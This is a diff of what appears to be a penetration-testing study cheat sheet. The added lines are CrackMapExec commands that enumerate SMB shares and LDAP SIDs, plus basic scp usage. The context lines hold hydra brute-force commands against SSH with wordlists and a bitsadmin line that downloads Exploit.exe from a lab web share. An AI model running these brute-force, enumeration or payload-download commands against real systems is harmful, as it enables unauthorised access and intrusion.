@@ -39,6 +39,11 @@ hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Deskto
 hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ssh://
 
 
+cme smb <target> --shares -u <user> -p <password>
+cme ldap <target> --get-sid
+
+
+
 smbclient -L //192.168.10.101
 
 sha256sum ~/Downloads/Tools.rar
@@ -49,6 +54,12 @@ mkdir /var/www/html/share
 chmod -R 755 /var/www/html/share
 chown -R www-data:www-data /var/www/html/share
 bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
+
+SCP:
+scp /path/to/local/file.txt username@remote_host:/path/to/destination/ (Send a file)
+scp username@remote_host:/path/to/remote/file.txt /path/to/local/destination/ (Download a file)
+Use -r for folder
+
 
 ent ~/Downloads/Tornado.elf
 
